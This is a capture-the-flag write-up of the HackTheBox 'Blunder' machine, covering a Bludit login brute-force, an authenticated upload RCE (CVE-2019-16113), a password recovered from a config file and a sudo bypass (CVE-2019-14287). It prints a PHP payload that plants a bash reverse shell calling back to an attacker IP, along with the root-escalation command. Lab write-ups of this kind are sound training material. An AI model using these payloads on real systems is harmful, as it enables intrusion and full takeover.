---
layout: post
title: Blunder
has_children: no
parent: HackTheBox
date: 2020-05-30
nav_order: 20200530
difficulty: Easy
reading_time: 6 min
screenshots: /assets/images/Screenshots/Blunder/
tags: HackTheBox Easy B2R Linux Bludit custom-wordlist brute-force CVE-2019-16113 RCE lateral-movement password-guessing hardcoded-credentials sudo-privesc CVE-2019-14287
---

{% include header.html %}
![iconTable]({{page.screenshots}}blunder.png)

---

{% include TOC.md %}

### Improved skills:

- Wordlist customization
- Python coding
- CVE Research
- Manual Exploitation
- Configuration file review

### Used tools:

- nmap
- gobuster
- cewl
- Burp Suite
- crackstation.net

---

[^*]: a Metasploit module also exists.

## Introduction & Foothold

**Blunder** is an easy box based on *CVE research* and a *real-life approach*, like **OSCP** machines. It requires *good enumeration* and a *deep research* during post exploitation.

Let's start as always with a **nmap** scan in order to find open ports and services:

```bash
root@kali:/HackTheBox/Machine/Blunder# nmap 10.10.10.191 -sV -sC -O -A --script=banner -oA nmap.txt
PORT   STATE  SERVICE VERSION
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: HP P2000 G3 NAS device (91%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (88%), Linux 3.1 (88%), Linux 3.2 (88%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (87%), OpenWrt White Russian 0.9 (Linux 2.4.30) (87%), Asus RT-AC66U router (Linux 2.6) (87%), Asus RT-N16 WAP (Linux 2.6) (87%), Asus RT-N66U WAP (Linux 2.6) (87%)
No exact OS matches for host (test conditions non-ideal).
```

The tool reveals that there is only a single port open on the box: the **HTTP port 80**, with an *Apache httpd 2.4.41* web server over.
Because we don't have any useful information, we need to perform some *manual recon* browsing the site.

Unfortunately visiting the site we found only few articles without useful stuff (for now :wink:).
We need to enumerate other existing files and directories using **gobuster** in search of other useful information:

```bash
root@kali:/HackTheBox/Machine/Blunder# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x .html,.php,.txt,.old
...
/about (Status: 200)
/0 (Status: 200)
/admin (Status: 301)
/install.php (Status: 200)
/robots.txt (Status: 200)
/todo.txt (Status: 200)
/usb (Status: 200)
/LICENSE (Status: 200)
```

Gobuster found a bunch of elements, some of which very interesting: first of all the **/admin** directory (which present an authentication form whose we don't know credentials), the */robots.txt* (that in this case isn't very helpful), the **/install.php** file and the **/todo.txt** file, containing the following text:

```txt
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

Good, it seems we have found a user called **fergus**.

Moreover, reading the output of **install.php**, we discovered that Blunder is nothing else than a **bludit** installation.

![2020-06-03-14-16-15]({{page.screenshots}}/2020-06-03-14-16-15.png)

Now that we found the application name, we need to find the respective software version. To achieve this, we can visit the [official bludit site](https://www.bludit.com/) and search within the documentation for the directory structure and where important files are.

![2020-06-03-14-30-54]({{page.screenshots}}/2020-06-03-14-30-54.png)

![2020-06-03-14-34-18]({{page.screenshots}}/2020-06-03-14-34-18.png)

![2020-06-03-14-47-38]({{page.screenshots}}/2020-06-03-14-47-38.png)

Alright, we know that we are dealing with **Bludit 3.9.2** and we also know the structure of the various directories and that the listing is enabled. All useful stuff but at the moment it seems that the only way to proceed is bypassing the login form.

![2020-06-03-14-15-11]({{page.screenshots}}/2020-06-03-14-15-11.png)

Let's try standard / weak credentials with the **fergus** user, but without success.
Trying to make brute force with standard wordlist instead we get a ban.

Googling a bit I found [this article](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) about bypassing the **Bludit Brute Force Mitigation**, however no wordlist still works.
Let's try to create our personalized wordlist using **cewl**:

```bash
root@kali:/HackTheBox/Machine/Blunder# cewl -m 5 -w customList.txt http://10.10.10.191
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
root@kali:/mnt/hgfs/ownCloud/Documents/CTF/HackTheBox/Machine/Blunder/files# tail customList.txt
Blunder
Pagination
HackTheBox
typically
visited
simple
things
contact
small
story
```

and execute again the article's script, this time with our wordlist

![2020-06-05-00-46-14]({{page.screenshots}}/2020-06-05-00-46-14.png)

![2020-06-05-00-46-36]({{page.screenshots}}/2020-06-05-00-46-36.png)

Here we are, **we got the password!** We can proceed into the admin section.

Searching online we find that there are several vulnerabilities for bludit, especially for this particular version, including an authenticated [RCE](https://www.cvedetails.com/cve/CVE-2019-16113/) that can be perfect for us as we already get the creds.

The *CVE-2019-16113* exploitation allows two different approaches:

- using the [metasploit exploit](https://packetstormsecurity.com/files/155295/Bludit-Directory-Traversal-Image-File-Upload.html)
- manual exploitation following [this thread](https://github.com/bludit/bludit/issues/1081)

Since I am practicing for OSCP, I will follow the manual approach.

As said in the github thread listed above, Bludit 3.9.2 present an **RCE vulnerability** in an authenticated site section, in detail the vulnerable function is the *images upload*.
Due to some bad checks, it is possible to *upload an image* with some *code injected* into an arbitrary folder, uploading a *.htaccess* file  and *execute the code injected* into the image.

These are the detailed steps:

1. Using **Burp Suite** we intercept and edit the image upload request in order to arbitrary change the path where the image will be saved (editing the **uuid** field) and injecting our php payload.

   ![2020-06-04-18-33-37]({{page.screenshots}}/2020-06-04-18-33-37.png)

   Server response is a 200 OK, meaning that the file has been uploaded

   ![2020-06-04-18-33-56]({{page.screenshots}}/2020-06-04-18-33-56.png)

2. Using the Burp Suite **repeater function** we edit the previous request in order to upload an **.htaccess** file that allow the image's injected code execution.

   ![2020-06-04-18-34-09]({{page.screenshots}}/2020-06-04-18-34-09.png)
   **Note**: the server responds with an error message, however the file has been uploaded anyway

   ![2020-06-04-18-34-22]({{page.screenshots}}/2020-06-04-18-34-22.png)

3. Sending a GET request to the image, we are executing the code injected into. Because the payload was  

   ```php
   <?php file_put_contents("../../uploads/webShell.php","<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.28/1234 0>&1'\"); ?> "); ?>
   ```

   we are creating a php reverse shell.

   ![2020-06-04-18-34-38]({{page.screenshots}}/2020-06-04-18-34-38.png)

4. Now that we have a php reverse shell on the server we just have to listen with **netcat** waiting for the connection and run the php file.

   ![2020-06-04-18-34-48]({{page.screenshots}}/2020-06-04-18-34-48.png)

   ![2020-06-04-18-35-22]({{page.screenshots}}/2020-06-04-18-35-22.png)


## Lateral Movement to Hugo

Now that we are into the box with a low-privileged shell, we need to find a way to **move laterally** to someone else with higher privileges.
Let's go hunting for **hardcoded passwords** into configuration files. The `/bl-content/databases/` seems to be the right place, and in fact the `/users.php` file contains what we were looking for: a **hashed password** of a machine user.

```bash
www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",  
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

The hash can be easily reverted using online tools like [crackstation](https://crackstation.net), and it turns out to be a **sha1** hash of **_Password120_** .

Now we are able to switch to **hugo**!


## Privilege Escalation

Privilege escalation can be reached through a rapid google research.

Now that we are *hugo* we can check if he can run some **sudo** commands:

```bash
hugo@blunder:~$ sudo -V
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
hugo@blunder:~$ sudo -l
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

We notice that _hugo_ can't run `/bin/bash` as **root**. However, a rapid google research reveals that for **sudo 1.8.28 or less** exists a public exploit ([47502](https://www.exploit-db.com/exploits/47502)) (CVE-2019-14287) that allow to perform privilege escalation executing commands as **user #-1**.

> ...
> Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv

So ...

```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
root@blunder:/home/hugo#
```

**we are root!**


## Trophy
```
Persistence is very important. You should not give up unless you are forced to give up.<br>
- Elon Musk
```

<br>
{% include share.html %}
